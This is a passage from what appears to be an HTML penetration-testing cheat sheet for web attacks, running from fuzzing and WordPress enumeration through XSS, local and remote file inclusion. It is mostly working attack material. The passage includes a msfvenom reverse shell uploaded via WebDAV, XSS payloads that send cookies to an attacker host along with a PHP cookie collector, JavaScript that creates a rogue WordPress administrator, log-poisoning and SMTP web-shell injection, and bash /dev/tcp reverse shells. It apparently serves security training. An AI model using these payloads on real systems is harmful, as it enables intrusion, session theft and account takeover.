# Skip SSL Certificate validation
wfuzz --hc 404 -c -k -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://&lt;target_ip&gt;/FUZZ

# Use threads to speed up process (not advisable to exceed 200)
wfuzz --hc 404 -c -t &lt;number_of_threads&gt; -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://&lt;target_ip&gt;/FUZZ
</code></pre>
              <h4 id="313-file-discovery">3.1.3 File Discovery</h4>
              <h5 id="3131-ffuf">3.1.3.1 FFUF</h5>
              <pre><code class="language-bash"># Basic file fuzzing
ffuf -w /path/to/wordlist.txt -u http://target/FUZZ

# Filter to show only 200 or 3xx responses
ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -mc 200,300-399

# Specify extensions
ffuf -w /path/to/wordlist.txt:FUZZ -u http://target/FUZZ.html,http://target/FUZZ.php -mc 200,300-399

# Output results to a file
ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -o results.txt

# Set number of threads
ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -t 50

# Use proxy
ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -x http://127.0.0.1:8080
</code></pre>
              <h5 id="3132-dirb">3.1.3.2 DIRB</h5>
              <pre><code class="language-bash"># Basic file scanning with default extensions
dirb http://target /path/to/wordlist.txt -X .php,.html,.txt

# Save output to a file
dirb http://target /path/to/wordlist.txt -X .php,.html,.txt -o results.txt

# Use custom user-agent
dirb http://target /path/to/wordlist.txt -X .php,.html,.txt -a &quot;Mozilla/5.0&quot;

# Ignore non-existent pages
dirb http://target /path/to/wordlist.txt -X .php,.html,.txt -N

# Scan SSL (HTTPS)
dirb https://target /path/to/wordlist.txt -X .php,.html,.txt
</code></pre>
              <h5 id="3133-gobuster">3.1.3.3 GOBUSTER</h5>
              <pre><code class="language-bash"># Basic file scanning
gobuster dir -u http://target -w /path/to/wordlist.txt

# Filter to show only 200 responses
gobuster dir -u http://target -w /path/to/wordlist.txt -s 200

# Specify extensions
gobuster dir -u http://target -w /path/to/wordlist.txt -x php,html,txt

# Save output to a file
gobuster dir -u http://target -w /path/to/wordlist.txt -o results.txt

# Set number of threads
gobuster dir -u http://target -w /path/to/wordlist.txt -t 50

# Use proxy
gobuster dir -u http://target -w /path/to/wordlist.txt -p http://127.0.0.1:8080
</code></pre>
              <h5 id="3134-feroxbuster">3.1.3.4 FEROXBUSTER</h5>
              <pre><code class="language-bash"># Basic file scanning
feroxbuster -u http://target -w /path/to/wordlist.txt

# Filter to show only 200 responses
feroxbuster -u http://target -w /path/to/wordlist.txt -s 200

# Specify extensions
feroxbuster -u http://target -w /path/to/wordlist.txt -x php,html,txt

# Save output to a file
feroxbuster -u http://target -w /path/to/wordlist.txt -o results.txt

# Set number of threads
feroxbuster -u http://target -w /path/to/wordlist.txt -t 50

# Use proxy
feroxbuster -u http://target -w /path/to/wordlist.txt -p http://127.0.0.1:8080

# Exclude specific status codes
feroxbuster -u http://target -w /path/to/wordlist.txt -e php,html,txt -C 404,403

# Use custom user-agent
feroxbuster -u http://target -w /path/to/wordlist.txt -a &quot;Mozilla/5.0&quot;
</code></pre>
              <h5 id="3135-dirsearch">3.1.3.5 DIRSEARCH</h5>
              <pre><code class="language-bash"># Basic file scanning
dirsearch -u http://target -w /path/to/wordlist.txt

# Filter to show only 200 or 3xx responses
dirsearch -u http://target -w /path/to/wordlist.txt -i 200,300-399

# Specify extensions
dirsearch -u http://target -w /path/to/wordlist.txt -e php,html,txt

# Save output to a file
dirsearch -u http://target -w /path/to/wordlist.txt -r -o results.txt

# Set number of threads
dirsearch -u http://target -w /path/to/wordlist.txt -t 50

# Use proxy
dirsearch -u http://target -w /path/to/wordlist.txt -x http://127.0.0.1:8080
</code></pre>
              <h4 id="314-git-exposed">3.1.4 Git Exposed</h4>
              <p>In the case we found a git directory exposed in the web server. Git Dumper (<a
                  href="https://github.com/arthaud/git-dumper">https://github.com/arthaud/git-dumper</a>) is a tool used
                to dump the contents of exposed <code>.git</code> directories. These directories may contain sensitive
                information, including source code, configuration files, and credentials. The tool allows you to
                download and explore these contents to find vulnerabilities or sensitive data.</p>
              <pre><code class="language-shell"># Dump the contents of an exposed .git directory
git-dumper http://[IP/Domain]/.git website_git

# Search for common secrets in the dumped files
grep -r &#39;password&#39; .
grep -r &#39;apikey&#39; .

# View a specific file that may contain credentials or sensitive data
cat website_git/config/database.php

# Check the commit log
git log

# Then to check the commit diff
git show [commitID]
</code></pre>
              <p>An alternative to this tool could be the scripts <code>gitdumper.sh</code> and
                <code>extractor.sh</code> (check Tools Section).
              </p>
              <pre><code class="language-bash">./gitdumper.sh http://[domain].com/.git/ /path/to/save/git

# Check lasts commits
cd /path/to/git &amp;&amp; git status

# Read selecter commit number
git commit [commitNumber]

# Restore last commit
git reset --hard

# Automatic script to read and restore last git dump
./extractor.sh /.git/ extracted
</code></pre>
              <h4 id="315-cms">3.1.5 CMS</h4>
              <ul>
                <li><strong>WP Scan</strong></li>
              </ul>
              <pre><code class="language-bash"># Basic WordPress scan
wpscan --url http://$IP/wp/
</code></pre>
              <ul>
                <li><strong>WP Brute Forcing</strong></li>
              </ul>
              <pre><code class="language-bash"># Brute forcing WordPress login
wpscan --url http://$IP/wp/wp-login.php -U Admin --passwords /usr/share/wordlists/rockyou.txt --password-attack wp-login
</code></pre>
              <ul>
                <li><strong>Custom Path</strong></li>
              </ul>
              <pre><code class="language-bash">wpscan -u &quot;http://&lt;IP&gt;/&quot; --wp-content-dir &quot;&lt;custom-path&gt;&quot;
</code></pre>
              <ul>
                <li><strong>Enumerate Users</strong></li>
              </ul>
              <pre><code class="language-bash">wpscan -u &quot;http://&lt;IP&gt;/&quot; --enumerate u

# Using wordlist
wpscan -u &quot;http://&lt;IP&gt;/&quot; --username &lt;username&gt; -w /usr/share/SecList/Usernames/xato-usernames-top-1millions-20000.txt
</code></pre>
              <ul>
                <li><strong>Malicious Plugins</strong></li>
              </ul>
              <pre><code class="language-bash"># Using a malicious WordPress plugin
https://github.com/wetw0rk/malicious-wordpress-plugin

# Usage
python3 wordpwn.py [LHOST] [LPORT] [HANDLER]

# Example
python3 wordpwn.py 192.168.119.140 443 Y
</code></pre>
              <ul>
                <li><strong>Drupal Scan</strong></li>
              </ul>
              <pre><code class="language-bash"># Scan Drupal CMS
droopescan scan drupal -u [TARGET_URL]
</code></pre>
              <ul>
                <li><strong>.git Directory</strong></li>
              </ul>
              <pre><code class="language-bash"># Download the .git directory if exposed
sudo wget -r http://[TARGET_IP]/.git/

# Move into the .git directory locally
cd [TARGET_IP]

# Show Git commits and reveal sensitive information
sudo git show
</code></pre>
              <ul>
                <li><strong>simple-file-list Exploitation</strong></li>
              </ul>
              <pre><code class="language-plaintext"># Location and version info

[+] Simple File List
| Location: http://[TARGET_IP]/wp-content/plugins/simple-file-list/
| Last Updated: [LAST_UPDATE]
| [!] The version is out of date; the latest version is [LATEST_VERSION]

# Exploit for Simple File List &lt; [VULNERABLE_VERSION] - Unauthenticated Arbitrary File Upload

https://www.exploit-db.com/exploits/48979
</code></pre>
              <ul>
                <li><strong>Generate Keyword Dictionary</strong>: if the website contains written content, create your
                  own keyword dictionary.</li>
              </ul>
              <pre><code class="language-bash">cewl -w &lt;dictionary-file&gt; &quot;http://&lt;IP&gt;/&quot; --with-numbers
</code></pre>
              <ul>
                <li><strong>Detect Vulnerable Pluging</strong></li>
              </ul>
              <pre><code class="language-bash"># Detect vulnerable plugins
wpscan --url http(s)://&lt;IP&gt;/ --enumerate vp

# Detect all plugins
wpscan --url http(s)://&lt;IP&gt;/ --enumerate p

# Aggressive detection of all plugins
wpscan --url http(s)://&lt;IP&gt;/ --enumerate p --plugins-detection aggressive
</code></pre>
              <h4 id="316-webdav">3.1.6 WebDav</h4>
              <p><strong>Reference</strong>: <a
                  href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav</a>
              </p>
              <p><strong>Nmap Scan Results</strong></p>
              <pre><code class="language-bash">80/tcp    open  http          Microsoft IIS httpd 10.0
| http-webdav-scan:
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
</code></pre>
              <p><strong>Connecting to a WebDAV Server</strong></p>
              <pre><code class="language-bash"># Use cadaver
cadaver [IP]
</code></pre>
              <p><strong>Exploitation with Credentials</strong></p>
              <ol>
                <li>Generate a Reverse Shell Payload</li>
              </ol>
              <pre><code class="language-bash">msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=80 -f aspx -o shell.aspx
</code></pre>
              <ol start="2">
                <li>Upload Payload via WebDAV</li>
              </ol>
              <pre><code class="language-bash">curl -T &#39;shell.aspx&#39; &#39;http://$VictimIP/&#39; -u &lt;username&gt;:&lt;password&gt;
</code></pre>
              <ol start="3">
                <li>Start the listener</li>
              </ol>
              <pre><code class="language-bash">nc -nvlp 80
</code></pre>
              <ol start="4">
                <li>Trigger the Payload: access the uploaded shell <code>http://$VictimIP/shell.aspx</code></li>
              </ol>
              <h4 id="317-apis">3.1.7 APIs</h4>
              <pre><code class="language-bash"># Basic API exploration
curl http://$IP/api/

# Example output
[{&quot;string&quot;:&quot;/api/&quot;,&quot;id&quot;:13},{&quot;string&quot;:&quot;/article/&quot;,&quot;id&quot;:14},{&quot;string&quot;:&quot;/article/?&quot;,&quot;id&quot;:15},{&quot;string&quot;:&quot;/user/&quot;,&quot;id&quot;:16},{&quot;string&quot;:&quot;/user/?&quot;,&quot;id&quot;:17}] 

# Common API Pattern
/api_name/v1

# Explore specific endpoints
curl http://$IP/api/user/ 

http://[IP]:[PORT]/search
{&quot;query&quot;:&quot;*&quot;,&quot;result&quot;:&quot;&quot;}

curl -X GET &quot;http://[IP]:[PORT]/search?query=*&quot;
{&quot;query&quot;:&quot;*&quot;,&quot;result&quot;:&quot;&quot;}

curl -X GET &quot;http://[IP]:[PORT]/search?query=lol&quot;
{&quot;query&quot;:&quot;lol&quot;,&quot;result&quot;:&quot;&quot;}

# Use -d for data and -H for headers
curl -d &#39;{&quot;password&quot;:&quot;fake&quot;,&quot;username&quot;:&quot;admin&quot;}&#39; -H &#39;Content-Type: application/json&#39;  http://[IP]:[PORT]/users/v1/login

# Option to send request to proxy as well
--proxy 127.0.0.1:8080
</code></pre>
              <h4 id="318-wordlists">3.1.8 Wordlists</h4>
              <ul>
                <li>
                  <p>Directory discovery: <code>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></p>
                </li>
                <li>
                  <p>File discovery: <code>/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</code>
                  </p>
                </li>
                <li>
                  <p>PayloadsAllTheThings: <a
                      href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS Injection#exploit-code-or-poc">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc</a>
                  </p>
                </li>
                <li>
                  <p>SecLists directory: <code>/usr/share/seclists/Discovery/Web-Content/common.txt</code></p>
                </li>
                <li>
                  <p>SecLists file: <code>/usr/share/seclists/Discovery/Web-Content/big.txt</code></p>
                </li>
                <li>
                  <p>Custom Wordlist from HTML:</p>
                </li>
              </ul>
              <pre><code class="language-bash"># Get the website content
curl http://example.com &gt; example.txt

# Remove duplicated entries

# Crate the dictionary
html2dic example.txt
or
cewl -w createWordlist.txt https://www.example.com

# Improve the wordlist with rules
john ---wordlist=wordlist.txt --rules --stdout &gt; wordlist-modified.txt
</code></pre>
              <ul>
                <li>
                  <p>LFI Wordlist for Linux: <a
                      href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt">https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt</a>
                  </p>
                </li>
                <li>
                  <p>LFI Wordlist for Windows<a
                      href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt">https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt</a>
                  </p>
                </li>
                <li>
                  <p>General LFI Wordlist alternative: <a
                      href="https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt">https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt</a>
                  </p>
                </li>
              </ul>
              <h3 id="32-xss">3.2 XSS</h3>
              <h4 id="321-theory">3.2.1 Theory</h4>
              <p>Common characters to find it in input fields: <code>&lt; &gt; &#39; &quot; { } ;</code>.</p>
              <table class="custom-table">
                <thead>
                  <tr>
                    <th>Type</th>
                    <th>Description</th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td>Stored (Persistent)</td>
                    <td>The most critical type of XSS, which occurs when user input is stored on the back-end database
                      and then displayed upon retrieval (e.g., posts or comments).</td>
                  </tr>
                  <tr>
                    <td>Reflected (Non-Persistent)</td>
                    <td>Occurs when user input is displayed on the page after being processed by the backend server, but
                      without being stored (e.g., search result or error message).</td>
                  </tr>
                  <tr>
                    <td>DOM-Based</td>
                    <td>Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and
                      is completely processed on the client-side, without reaching the back-end server (e.g., through
                      client-side HTTP parameters or anchor tags).</td>
                  </tr>
                </tbody>
              </table>
              <h4 id="322-stored">3.2.2 Stored</h4>
              <p><strong>Basic Payload for Testing</strong>: if it is vulnerable once saved, when we access the website
                again we should see the code being executed.</p>
              <pre><code class="language-html"># Text to save to the application.
&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;

&lt;script&gt;alert(document.cookie)&lt;/script&gt;

&lt;script&gt;alert(window.origin)&lt;/script&gt;
</code></pre>
              <h4 id="323-reflected">3.2.3 Reflected</h4>
              <p>In this case usually we will include the payload in a URL, the most common place for this are the
                search pages, we can see the example below:</p>
              <pre><code class="language-bash">http://[SERVER_IP]:[PORT]/index.php?task=%3Cscript%3Ealert(document.cookie)%3C/script%3E
</code></pre>
              <div class="col-lg text-center" data-aos="fade-up">
                <figure class="figure">
                  <img src="img/xss01.png" class="img-fluid" alt="Reflected XSS Payload">
                  <figcaption class="figure-caption text-center">Reflected XSS Payload</figcaption>
                </figure>
              </div>
              <div class="col-lg text-center" data-aos="fade-up">
                <figure class="figure">
                  <img src="img/xss02.png" class="img-fluid" alt="Reflected XSS Result">
                  <figcaption class="figure-caption text-center">Reflected XSS Result</figcaption>
                </figure>
              </div>
              <h4 id="324-blind">3.2.4 Blind</h4>
              <p>A good way to test this is to see if we can retrieve files externally using the JavaScript code, we can
                use the payloads from PayloadsAllTheThings: <a
                  href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS Injection#exploit-code-or-poc">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc</a>.
              </p>
              <pre><code class="language-html">&lt;script src=http://[OUR_IP]&gt;&lt;/script&gt;

&#39;&gt;&lt;script src=http://[OUR_IP]&gt;&lt;/script&gt;

&lt;script&gt;$.getScript(&quot;http://[OUR_IP]&quot;)&lt;/script&gt;

&quot;&gt;&lt;script src=http://[OUR_IP]&gt;&lt;/script&gt;
javascript:eval(&#39;var a=document.createElement(\&#39;script\&#39;);a.src=\&#39;http://OUR_IP\&#39;;document.body.appendChild(a)&#39;)
&lt;script&gt;function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener(&quot;load&quot;, b);a.open(&quot;GET&quot;, &quot;//OUR_IP&quot;);a.send();&lt;/script&gt;
</code></pre>
              <h4 id="325-privesc-using-session-hijacking">3.2.5 PrivEsc Using Session Hijacking</h4>
              <p>We need to make sure that the cookie is stored in the browser, we also need to consider that cookies
                can have two flags:</p>
              <ul>
                <li><em>Secure:</em> only sends the cookie over an encrypted connection like HTTPS.</li>
                <li><em>HttpOnly</em>: denies Javascript access to cookie; so we need that this options de disabled, you
                  can check this in the Developer Tools of the browser.</li>
              </ul>
              <p>After verifying that the cookie could be steal by its flags and having a valid XSS field we can use one
                of the following payloads:</p>
              <ul>
                <li><strong>Option 1</strong></li>
              </ul>
              <pre><code class="language-html"># Possible Payloads
document.location=&#39;http://OUR_IP/index.php?c=&#39;+document.cookie;
or
new Image().src=&#39;http://OUR_IP/index.php?c=&#39;+document.cookie;

# Access the Host
&lt;script src=http://OUR_IP&gt;/script.js&lt;/script&gt;
</code></pre>
              <ul>
                <li><strong>Option 2</strong>:</li>
              </ul>
              <pre><code class="language-php"># Payload
&lt;img src=x onerror=fetch(&#39;http://10.10.14.37/&#39;+document.cookie);&gt;

# PHP Server Code
&lt;?php
if (isset($_GET[&#39;c&#39;])) {
    $list = explode(&quot;;&quot;, $_GET[&#39;c&#39;]);
    foreach ($list as $key =&gt; $value) {
        $cookie = urldecode($value);
        $file = fopen(&quot;cookies.txt&quot;, &quot;a+&quot;);
        fputs($file, &quot;Victim IP: {$_SERVER[&#39;REMOTE_ADDR&#39;]} | Cookie: {$cookie}\n&quot;);
        fclose($file);
    }
}
?&gt;
</code></pre>
              <h4 id="326-wordpress-httponly-cookie-visitor-plugin">3.2.6 Wordpress HttpOnly Cookie (Visitor Plugin)
              </h4>
              <ol>
                <li><strong>Gather WordPress Nonce</strong>: to attack with a HttpOnly cookie on WordPress: We need to
                  create a Js function that fetches the nonce which is a server generated token to prevent CSRF attacks.
                </li>
              </ol>
              <pre><code class="language-php">var request = new XMLHttpRequest();
var targetURL = &quot;/wp-admin/user-new.php&quot;;
var regex = /name=&quot;([^&quot;]*?)&quot;/g;
request.open(&quot;GET&quot;, targetURL, false);
request.send();
var match = regex.exec(request.responseText);
var nonce = match[1];
</code></pre>
              <ol start="2">
                <li><strong>Create New WordPress Admin Account</strong></li>
              </ol>
              <pre><code class="language-php">var params = &quot;action=createuser&amp;_wpnonce_create-user=&quot; + nonce + &quot;&amp;user_login=newadmin&amp;email=newadmin@example.com&amp;pass1=newpassword&amp;pass2=newpassword&amp;role=administrator&quot;;
var request = new XMLHttpRequest();
request.open(&quot;POST&quot;, targetURL, true);
request.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);
request.send(params);
</code></pre>
              <ol start="3">
                <li><strong>Compress the JavaScript Code</strong>: use the tool <a
                    href="https://jscompress.com/">JSCompress</a>.</li>
              </ol>
              <pre><code class="language-php">var params = &quot;action=createuser&amp;_wpnonce_create-user=&quot; + nonce + &quot;&amp;user_login=newadmin&amp;email=newadmin@example.com&amp;pass1=newpassword&amp;pass2=newpassword&amp;role=administrator&quot;;
var request = new XMLHttpRequest();
request.open(&quot;POST&quot;, targetURL, true);
request.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);
request.send(params);
</code></pre>
              <ol start="4">
                <li><strong>Encode the JavaScript Payload</strong>: use the following JS function.</li>
              </ol>
              <pre><code class="language-javascript">function toJavaScriptEncoding(str) {
    var result = &#39;&#39;;
    for (var i = 0; i &lt; str.length; i++) {
        result += str.charCodeAt(i);
        if (i !== str.length - 1) {
            result += &quot;,&quot;;
        }
    }
    return result;
}

let encodedPayload = toJavaScriptEncoding(&#39;insert_minified_javascript&#39;);
console.log(encodedPayload);
</code></pre>
              <ol start="5">
                <li><strong>Request and Execute the Payload</strong>: the function <code>eval</code> is responsible for
                  interpreting the string as code and execute it.</li>
              </ol>
              <pre><code class="language-bash">curl -i http://example.com --user-agent &quot;&lt;script&gt;eval(String.fromCharCode(&lt;resultFromRunningAboveScritpToEncode&gt;))&lt;/script&gt;&quot; --proxy 127.0.0.1:8080
</code></pre>
              <h4 id="327-automated-discovery">3.2.7 Automated Discovery</h4>
              <ul>
                <li>We can use the tool <strong>XSS Strike</strong>:</li>
              </ul>
              <pre><code class="language-bash">git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt

python xsstrike.py -u &quot;http://SERVER_IP:PORT/index.php?task=test&quot;
</code></pre>
              <ul>
                <li>We can also use <strong>fuzzing</strong> (sometimes trying the <code>user-agent</code> could also
                  reveal a vulnerable field):</li>
              </ul>
              <pre><code class="language-bash"># [xss.req] is the request captured from BurpSuite.
ffuf -ic -c -of csv -request-proto http -request [xss.req] -w XSS-RSNAKE.txt
</code></pre>
              <ul>
                <li><strong>Wordlist</strong>: <a
                    href="https://github.com/tennc/fuzzdb/blob/master/attack-payloads/xss/xss-rsnake.txt">https://github.com/tennc/fuzzdb/blob/master/attack-payloads/xss/xss-rsnake.txt</a>.
                </li>
              </ul>
              <h3 id="33-file-inclusion">3.3. File Inclusion</h3>
              <h4 id="331-local-file-inclusion-lfi">3.3.1 Local File Inclusion (LFI)</h4>
              <p>Local File Inclusion (LFI) allows attackers to read or execute files on the server by exploiting file
                inclusion mechanisms.</p>
              <h5 id="3311-scanning-for-lfi">3.3.1.1 Scanning for LFI</h5>
              <ul>
                <li>URL LFI <strong>Example</strong>:</li>
              </ul>
              <pre><code class="language-txt">http://&lt;target_url&gt;/file.php?recurse=&lt;file_name&gt;
</code></pre>
              <ul>
                <li><strong>Normal Fuzzing</strong>:</li>
              </ul>
              <pre><code class="language-bash">ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=FUZZ&#39; -fs 2287
</code></pre>
              <ul>
                <li><strong>Fuzz <code>GET</code> Parameters</strong>:</li>
              </ul>
              <pre><code class="language-bash">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?FUZZ=value&#39; -fs 2287
</code></pre>
              <ul>
                <li><strong>Fuzz PHP Files</strong>:</li>
              </ul>
              <pre><code class="language-bash">ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/FUZZ.php
</code></pre>
              <ul>
                <li><strong>Fuzz Webroot</strong>: to fuzz for index.php use <a
                    href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt">wordlist
                    for Linux</a> or <a
                    href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt">wordlist
                    for windows</a>, or this <a
                    href="https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt">general
                    wordlist alternative</a>; consider that depending on our LFI situation, we may need to add a few
                  back directories (e.g. <code>../../../../</code>), and then add our index.php afterwords.</li>
              </ul>
              <pre><code class="language-bash">ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ/index.php&#39; -fs 2287
</code></pre>
              <ul>
                <li><strong>Fuzz Server Logs and Configs</strong>: we can use the same wordlists as before.</li>
              </ul>
              <pre><code class="language-bash">ffuf -w ./LFI-WordList-Linux:FUZZ -u &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ&#39; -fs 2287
</code></pre>
              <h5 id="3312-bypassing-lfi-protections">3.3.1.2 Bypassing LFI Protections</h5>
              <p>Sometimes protections are in place to prevent directory traversal. These are common techniques to
                bypass such restrictions:</p>
              <pre><code class="language-bash"># URL encoding bypass
http://&lt;target_url&gt;/file.php?recurse=../../../../../etc/passwd% 

# Null byte injection bypass
http://&lt;target_url&gt;/file.php?recurse=../../../../../etc/passwd?nullbyte

# Avoiding ..
http://&lt;target_url&gt;/file.php?recurse=.?/.?/.?/.?/.?/etc/passwd
http://&lt;target_url&gt;/file.php?recurse=.*/.*/.*/.*/.*/etc/passwd
http://&lt;target_url&gt;/file.php?recurse=.?/.?/.?/.?/.?/etc/passwd

# Double URL encoding
http://&lt;target_url&gt;/file.php?recurse=%252e%252e%252fetc%252fpasswd

# Repeated slashes bypass
http://&lt;target_url&gt;/file.php?recurse=....//....//....//etc/passwd

# Viewing a file with null byte injection
http://&lt;target_url&gt;/file.php?recurse=../../../../../etc/passwd%00

# Bypass file extension restrictions
http://&lt;target_url&gt;/file.php?recurse=../../../../../etc/passwd%2500.jpg

# Retrieve system environment variables
http://&lt;target_url&gt;/file.php?recurse=../../../../../proc/self/environ
</code></pre>
              <h5 id="3313-lfi-wrappers">3.3.1.3 LFI Wrappers</h5>
              <p>Wrappers are mechanisms that let you change the file processing behavior to reveal sensitive data or
                interact with server components:</p>
              <ul>
                <li><strong>Base64 encode a file:</strong></li>
              </ul>
              <pre><code class="language-bash">http://&lt;target_url&gt;/file.php?recurse=php://filter/convert.base64-encode/resource=&lt;file_name&gt;

# Decode base64-encoded output
echo &quot;&lt;BASE64_ENCODED_OUTPUT&gt;&quot; | base64 -d
</code></pre>
              <ul>
                <li><strong>ROT13 encoding:</strong></li>
              </ul>
              <pre><code class="language-bash">http://&lt;target_url&gt;/file.php?recurse=php://filter/read=string.rot13/resource=&lt;file_name&gt;
</code></pre>
              <ul>
                <li><strong>PHP Wrapper:</strong></li>
              </ul>
              <pre><code class="language-bash">curl &quot;http://&lt;TARGET&gt;/index.php?page=php://filter/convert.base64-encode/resource=&lt;FILE&gt;&quot;
</code></pre>
              <h5 id="3314-remote-code-execution-via-lfi">3.3.1.4 Remote Code Execution via LFI</h5>
              <h6 id="33141-log-poisoning-apache-or-ssh-logs">3.3.1.4.1 Log Poisoning (Apache or SSH Logs)</h6>
              <p>If log files such as <code>/var/log/apache2/access.log</code> or <code>/var/log/auth.log</code> are
                accessible through LFI, you can inject malicious code into the logs to achieve RCE.</p>
              <ol>
                <li>Verify if log files can be accessed via LFI:</li>
              </ol>
              <pre><code class="language-bash">http://&lt;target_url&gt;/file.php?recurse=../../../../../var/log/apache2/access.log
</code></pre>
              <ol start="2">
                <li>Inject a malicious PHP payload into the logs via SSH:</li>
              </ol>
              <pre><code class="language-bash">ssh &quot;&lt;?php system(&#39;whoami&#39;); ?&gt;&quot;@&lt;target&gt;
</code></pre>
              <ol start="3">
                <li>Access the log file via LFI to execute the payload:</li>
              </ol>
              <pre><code class="language-bash">http://&lt;target_url&gt;/file.php?recurse=../../../../../var/log/auth.log
</code></pre>
              <h6 id="33142-mail-php-execution-rce-via-email">3.3.1.4.2 Mail PHP Execution (RCE via Email)</h6>
              <p>Using LFI, after enumerating users (e.g., <code>/etc/passwd</code>), you can attempt to execute PHP
                code through a mail server by embedding PHP in email data.</p>
              <ol>
                <li>Connect to the mail server:</li>
              </ol>
              <pre><code class="language-bash">telnet &lt;target_ip&gt; 25
</code></pre>
              <ol start="2">
                <li>Inject PHP payload into the email service:</li>
              </ol>
              <pre><code class="language-bash">HELO localhost
MAIL FROM:&lt;root&gt;
RCPT TO:&lt;www-data&gt;
DATA
&lt;?php echo shell_exec($_REQUEST[&#39;cmd&#39;]); ?&gt;
.
</code></pre>
              <ol start="3">
                <li>If unsure about the users on the system, perform user enumeration:</li>
              </ol>
              <pre><code class="language-bash">smtp-user-enum -M VRFY -U &lt;username_list&gt; -t &lt;target_ip&gt;
</code></pre>
              <h5 id="3315-reverse-shell-via-lfi">3.3.1.5 Reverse Shell via LFI</h5>
              <p>You can use <code>/proc/self/environ</code> to inject a shell. If the environment variables are
                writable, inject PHP code into the environment.</p>
              <ol>
                <li>Send the PHP payload:</li>
              </ol>
              <pre><code class="language-bash">curl -X POST -d &quot;cmd=&lt;?php system(&#39;bash -i &gt;&amp; /dev/tcp/&lt;attacker_ip&gt;/&lt;port&gt; 0&gt;&amp;1&#39;); ?&gt;&quot; http://&lt;target_url&gt;/file.php?recurse=../../../../../proc/self/environ
</code></pre>
              <ol start="2">
                <li>Access the file via LFI to trigger the reverse shell:</li>
              </ol>
              <pre><code class="language-bash">http://&lt;target_url&gt;/file.php?recurse=../../../../../proc/self/environ
</code></pre>
              <h5 id="3316-useful-tools">3.3.1.6 Useful Tools</h5>
              <ul>
                <li><strong>LFISuite</strong>: A tool to automate exploitation of LFI vulnerabilities.</li>
              </ul>
              <pre><code class="language-bash">git clone https://github.com/D35m0nd142/LFISuite
</code></pre>
              <ul>
                <li><strong>RFIScanner</strong>: A simple Python-based RFI vulnerability scanner.</li>
              </ul>
              <pre><code class="language-bash">python rfiscanner.py &lt;target_url&gt;
</code></pre>
              <h4 id="332-remote-file-inclusion-rfi">3.3.2 Remote File Inclusion (RFI)</h4>
              <p>Remote File Inclusion (RFI) allows attackers to include external files into the web server&rsquo;s
                execution
                context, potentially leading to Remote Code Execution (RCE).</p>
              <h5 id="3321-basic-rfi-example">3.3.2.1 Basic RFI Example</h5>
              <p>If a web application allows including a remote file, you can execute arbitrary code by referencing an
                external malicious script:</p>
              <pre><code class="language-bash"># This assumes the server&#39;s allow_url_fopen or allow_url_include settings are enabled.
http://&lt;target_url&gt;/file.php?recurse=http://&lt;attacker_ip&gt;/malicious.php
</code></pre>
              <h5 id="3322-reverse-shell-via-rfi">3.3.2.2 Reverse Shell via RFI</h5>
              <ol>
                <li><strong>Start a Simple HTTP Server</strong>:</li>
              </ol>
              <pre><code class="language-bash">python3 -m http.server 80
</code></pre>
              <ol start="2">
                <li><strong>Host the malicious PHP reverse shell (e.g., <code>revshell.php</code>) on your own
                    server</strong>:</li>
              </ol>
              <pre><code class="language-bash"># Option 1: Reverse Shell via PHP
&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;

# Option 2: Reverse Shell via Bash
bash -c &quot;sh -i &gt;&amp; /dev/tcp/[LHOST]/[LPORT] 0&gt;&amp;1&quot;
</code></pre>
              <ol start="3">
